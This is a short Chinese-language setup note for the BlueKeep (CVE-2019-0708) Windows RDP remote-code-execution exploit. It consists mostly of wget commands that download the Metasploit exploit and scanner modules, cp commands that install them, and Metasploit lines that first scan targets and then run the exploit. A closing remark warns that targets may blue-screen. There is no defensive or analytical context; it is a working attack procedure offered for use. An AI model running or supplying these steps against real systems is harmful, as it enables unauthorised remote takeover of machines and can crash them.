# bluekeep

```
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
```

> 已保存到rb文件夹下

## 下载下来后，直接复制到对应的路径。

```sh
cp rdp.rb /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/

cp rdp_scanner.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/

# 如果这里没有rdp目录，就用mkdir命令创建一个rdp目录

cp cve_2019_0708_bluekeep_rce.rb /opt/metasploit-framework/embedded/framework/modules/exploits/rdp/

cp cve_2019_0708_bluekeep.rb /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/
```

## 使用`reload_all`重新加载0708rdp利用模块

先 `use auxiliary/scanner/rdp/cve_2019_0708_bluekeep` 扫一下

再  `use exploit/rdp/cve_2019_0708_bluekeep_rce` 

> 小心蓝屏


